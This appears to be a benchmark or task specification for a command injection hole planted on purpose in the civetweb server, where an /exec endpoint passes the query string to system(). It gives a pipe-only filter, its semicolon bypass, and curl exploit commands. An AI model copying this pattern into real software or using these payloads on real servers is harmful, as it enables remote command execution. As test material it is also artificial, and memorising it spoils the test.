DESCRIPTION:
  CLI-flag-gated command injection vulnerability in civetweb standalone server.
  The /exec endpoint is registered via mg_set_request_handler() in main.c.
  The server must be started with the appropriate gate flags for the endpoint
  to be reachable; without them it returns 404.

CONFIG_GATE (C3 (three globals + utility function)):
  mechanism:  Three CLI flags (--exec-mode, --exec-logging, --exec-debug),
              each stored in a static global int.
  check:      exec_is_ready() returns true only when all three are set.
  complexity: three conditions, three flags, utility function guard

INPUT_FLOW (I2 (snprintf buffer)):
  entry:      HTTP GET /exec?cmd=<payload>
  path:       exec_handler() reads query_string, copies to char cmd[512]
              via snprintf(cmd, sizeof(cmd), "%s", qs+4), then calls system(cmd)
  transforms: snprintf copy (truncates at 511 bytes)

SANITIZATION (S2 (block pipe, bypass with semicolon)):
  mechanism:  loops over cmd characters, rejects any pipe character
  bypass:     use semicolon for command chaining

SINK:        system() in exec_handler() (src/main.c)

CHANGED FILES:
  src/main.c -- 4 hunks:
    1. globals:  added exec_mode, exec_logging, exec_debug + exec_is_ready()
    2. handler:  new exec_handler() with I2 flow and S2 sanitization
    3. prescan:  prescan_exec_args() removes our flags before civetweb parser
    4. start:    prescan call + mg_set_request_handler() registration

EXPLOIT:
  build:   bash build.sh
  start:   ./civetweb --exec-mode --exec-logging --exec-debug \
               -listening_ports 18044 -document_root /tmp
  trigger: curl 'http://127.0.0.1:18044/exec?cmd=id%3E/tmp/pwned'
  verify:  cat /tmp/pwned
  bypass:  use semicolon: cmd=id;id>/tmp/pwned
  gate:    omit any flag => 404

NOTES:
  snprintf truncates at 511 bytes. Pipe blocked; use semicolon for chaining.
